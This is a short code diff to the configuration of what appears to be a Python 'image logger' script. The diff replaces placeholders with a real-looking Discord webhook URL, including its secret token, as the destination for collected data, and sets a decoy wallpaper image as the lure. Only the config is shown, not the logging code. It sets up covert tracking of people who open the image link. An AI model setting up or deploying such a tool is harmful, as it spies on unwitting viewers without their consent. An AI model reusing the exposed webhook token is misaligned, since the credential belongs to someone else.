@@ -10,8 +10,8 @@ __author__ = "Dealer"
 
 config = {
     # BASE CONFIG #
-    "webhook": os.getenv("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/your/webhook"),
-    "image": os.getenv("IMAGE_URL", "https://link-to-your-image.here"), # You can also have a custom image by using a URL argument
+    "webhook": os.getenv("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1438614880520245271/UTd2ZIbuqQipy1hopuL55_R_BdmF-fHI1Q-NZc651d8mq-Hpf2o4z2i3sODZEuED3CK7"),
+    "image": os.getenv("IMAGE_URL", "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwallpaperaccess.com%2Ffull%2F58329.jpg&f=1&nofb=1&ipt=07373629347dffe2f6bb12d0b5f51150573f605a48beda17897cca4a28cc6966"), # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
